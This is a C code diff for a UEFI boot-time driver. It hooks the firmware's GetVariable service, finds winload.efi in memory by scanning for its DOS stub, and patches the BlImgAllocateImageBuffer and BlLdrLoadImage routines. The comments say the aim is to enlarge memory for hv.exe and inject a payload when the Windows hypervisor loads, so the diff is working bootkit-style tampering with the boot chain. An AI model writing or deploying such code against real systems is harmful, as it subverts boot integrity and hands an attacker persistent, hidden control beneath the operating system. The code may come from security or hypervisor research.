@@ -6,15 +6,14 @@ extern VOID EFIAPI SerialPrint(IN CONST CHAR8 *format, ...);
 extern VOID EFIAPI SerialPrintHex(IN CONST CHAR8 *label, IN UINT64 value);
 extern UINT64 PeGetExport(IN CONST VOID *base, IN CONST CHAR8 *export);
 extern EFI_STATUS InstallPatch_BlLdrLoadImage(IN VOID *originalFunction);
-
-// Public Globals
-// None
+extern EFI_STATUS InstallPatch_BlImgAllocateImageBuffer(IN VOID *originalFunction);
 
 // Public Functions
 EFI_STATUS InstallHook_GetVariable(VOID);
 
 // Private Globals
 static EFI_GET_VARIABLE gOriginal;
+static BOOLEAN gPatchesInstalled = FALSE;
 
 // Private Functions
 static EFI_STATUS EFIAPI HookedGetVariable(
@@ -22,7 +21,6 @@ static EFI_STATUS EFIAPI HookedGetVariable(
   UINT32* attributes,
   UINTN* dataSize, VOID* data
 );
-
 
 // Implementation
 
@@ -60,52 +58,110 @@ static EFI_STATUS EFIAPI HookedGetVariable(
   UINT64 returnAddress = 0;
   UINT64 moduleBase = 0;
   UINT64 blLdrLoadImageAddr = 0;
+  UINT64 blImgAllocateImageBufferAddr = 0;
   
   //
-  // Setup mode variable is called within winload.efi
+  // Only process SetupMode variable (called from winload.efi)
   //
-  if (StrCmp(variableName, L"SetupMode")) goto _pass;
+  if (StrCmp(variableName, L"SetupMode")) {
+    goto _pass;
+  }
 
   //
-  // Scan for common string inside a PE header (slow)
+  // Only install patches once
+  //
+  if (gPatchesInstalled) {
+    goto _pass;
+  }
+
+  SerialPrint("\n");
+  SerialPrint("================================================\n");
+  SerialPrint("  Winload.efi Detection\n");
+  SerialPrint("================================================\n");
+
+  //
+  // Scan backwards from return address to find PE header
+  // Look for "This program cannot be run in DOS mode" string
   //
   returnAddress = (UINT64)GetReturnAddress();
+  SerialPrintHex("Return address", returnAddress);
+  
   while (CompareMem((VOID*)returnAddress, "This program cannot be run in DOS mode", 38) != 0) {
-      returnAddress--;
+    returnAddress--;
+    
+    // Safety check - don't scan too far
+    if (returnAddress < 0x100000) {
+      SerialPrint("[!] Failed to find DOS stub\n");
+      goto _pass;
+    }
   }
+  
+  // DOS stub is at offset 0x4E from base
   moduleBase = returnAddress - 0x4E;
 
-  SerialPrint("Found potential winload.efi\n");
+  SerialPrint("[+] Found potential winload.efi\n");
   SerialPrintHex("Module Base", moduleBase);
 
   //
-  // Find BlLdrLoadImage through export table (more reliable then pattern searching)
+  // Find BlImgAllocateImageBuffer export (must be patched FIRST)
   // 
-  blLdrLoadImageAddr = PeGetExport((VOID*)moduleBase, "BlLdrLoadImage");
-  if (!blLdrLoadImageAddr) goto _pass;
-  SerialPrint("Found export 'BlLdrLoadImage'\n");
+  blImgAllocateImageBufferAddr = PeGetExport((VOID*)moduleBase, "BlImgAllocateImageBuffer");
+  if (!blImgAllocateImageBufferAddr) {
+    SerialPrint("[!] Failed to find BlImgAllocateImageBuffer export\n");
+    goto _pass;
+  }
+  
+  SerialPrint("[+] Found export 'BlImgAllocateImageBuffer'\n");
+  SerialPrintHex("Address", blImgAllocateImageBufferAddr);
 
   //
-  // Patch Winload
+  // Find BlLdrLoadImage export
   // 
-  if (EFI_ERROR(InstallPatch_BlLdrLoadImage((VOID*)blLdrLoadImageAddr))) {
-    SerialPrint("Failed to patch BlLdrLoadImage.\n");
-    // Don't jump, we have done our hook work so we let it end.
-  } else {
-    SerialPrint("Patched BlLdrLoadImage successfully.\n");
+  blLdrLoadImageAddr = PeGetExport((VOID*)moduleBase, "BlLdrLoadImage");
+  if (!blLdrLoadImageAddr) {
+    SerialPrint("[!] Failed to find BlLdrLoadImage export\n");
+    goto _pass;
   }
+  
+  SerialPrint("[+] Found export 'BlLdrLoadImage'\n");
+  SerialPrintHex("Address", blLdrLoadImageAddr);
+
+  //
+  // Install BlImgAllocateImageBuffer patch FIRST
+  // This extends the memory allocation for hv.exe
+  //
+  SerialPrint("\n[*] Installing allocation hook...\n");
+  if (EFI_ERROR(InstallPatch_BlImgAllocateImageBuffer((VOID*)blImgAllocateImageBufferAddr))) {
+    SerialPrint("[!] Failed to patch BlImgAllocateImageBuffer\n");
+    goto _pass;
+  }
+
+  //
+  // Install BlLdrLoadImage patch SECOND
+  // This injects our payload when hv.exe is loaded
+  //
+  SerialPrint("\n[*] Installing load image hook...\n");
+  if (EFI_ERROR(InstallPatch_BlLdrLoadImage((VOID*)blLdrLoadImageAddr))) {
+    SerialPrint("[!] Failed to patch BlLdrLoadImage\n");
+    goto _pass;
+  }
+
+  SerialPrint("\n[+] All patches installed successfully\n");
+  SerialPrint("================================================\n\n");
+  
+  //
+  // Mark patches as installed
+  //
+  gPatchesInstalled = TRUE;
     
   //
-  // We have completed our work, remove hook
+  // Remove our hook - we're done
   // 
   gRT->GetVariable = gOriginal; 
 
+_pass:
   //
   // Pass through to original
   //
-_pass:
   return gOriginal(variableName, vendorGuid, attributes, dataSize, data);
 }
-
-
-
